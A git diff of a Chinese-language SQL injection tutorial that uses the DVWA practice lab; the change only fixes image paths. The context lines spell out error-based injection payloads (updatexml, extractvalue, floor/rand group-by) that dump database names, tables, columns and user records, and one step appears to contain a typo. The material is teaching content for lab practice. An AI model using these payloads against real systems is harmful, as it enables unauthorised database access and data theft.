@@ -75,63 +75,63 @@ SQL 注入通常分为两种类型：数字型和字符型
 
 1.爆数据库和用户名：`1' and updatexml(1,concat(0x7e,database(),0x7e,user()),1)#`
 
-输出结果： ![测试结果](../../images/sql注入篇/1.png)
+输出结果： ![测试结果](images/sql注入篇/1.png)
 
 2.爆当前数据库的表信息：`1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)#`
 
-输出结果： ![测试结果](../../images/sql注入篇/2.png)
+输出结果： ![测试结果](images/sql注入篇/2.png)
 
 3.爆 dvwa 数据库中的 user 表的字段信息：`1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'),0x7e),1)#`
 
-输出结果： ![测试结果](../../images/sql注入篇/3.png)
+输出结果： ![测试结果](images/sql注入篇/3.png)
 
 4.爆数据库内容：`1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e),1)#`
 
-输出结果： ![测试结果](../../images/sql注入篇/4.png)
+输出结果： ![测试结果](images/sql注入篇/4.png)
 
 ### 三、extractvalue 函数实战（基于 dvwa 靶场）
 
 1.爆数据库和用户名：`1' and extractvalue(1,concat(0x7e,database(),0x7e,user()))#`
 
-输出结果： ![测试结果](../../images/sql注入篇/1.png)
+输出结果： ![测试结果](images/sql注入篇/1.png)
 
 2.爆当前数据库的表信息：`1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))#`
 
-输出结果： ![测试结果](../../images/sql注入篇/2.png)
+输出结果： ![测试结果](images/sql注入篇/2.png)
 
 3.爆 dvwa 数据库中的 user 表的字段信息：`1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')))#`
 
-输出结果： ![测试结果](../../images/sql注入篇/3.png)
+输出结果： ![测试结果](images/sql注入篇/3.png)
 
 4.爆数据库内容：`1' and extractvalue(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e))#`
 
-输出结果： ![测试结果](../../images/sql注入篇/4.png)
+输出结果： ![测试结果](images/sql注入篇/4.png)
 
 ### 四、floor 函数实战 (基于 dvwa 靶场)
 
 1.判断是否存在报错注入：`1' union select count(*),floor(rand(0)*2) x from information_schema.tables group by x#`
 
-输出结果： ![测试结果](../../images/sql注入篇/5.png)
+输出结果： ![测试结果](images/sql注入篇/5.png)
 
 确认存在报错注入
 
 2.爆当前数据库名：`1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #`
 
-输出结果： ![测试结果](../../images/sql注入篇/6.png)
+输出结果： ![测试结果](images/sql注入篇/6.png)
 
 可以看到数据库名为 dvwa，1 是随机数
 
 3.爆当前数据库表信息：`1' union select count(*),concat(floor(0)*2,0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)) x from information_schema.schemata group by x#`
 
-输出结果： ![测试结果](../../images/sql注入篇/7.png)
+输出结果： ![测试结果](images/sql注入篇/7.png)
 
 4.爆数据库表中字段信息：`1' union select count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)) x from information_schema.schemata group by x#`
 
-输出结果： ![测试结果](../../images/sql注入篇/8.png)
+输出结果： ![测试结果](images/sql注入篇/8.png)
 
 5.爆数据库内容：`1' union select count(*),concat(floor(rand(0)*2),(select group_concat(first_name,last_name) from dvwa.users)) x from information_schema.schemata group by x#`
 
-输出结果： ![测试结果](../../images/sql注入篇/9.png)
+输出结果： ![测试结果](images/sql注入篇/9.png)
 
 
 ---
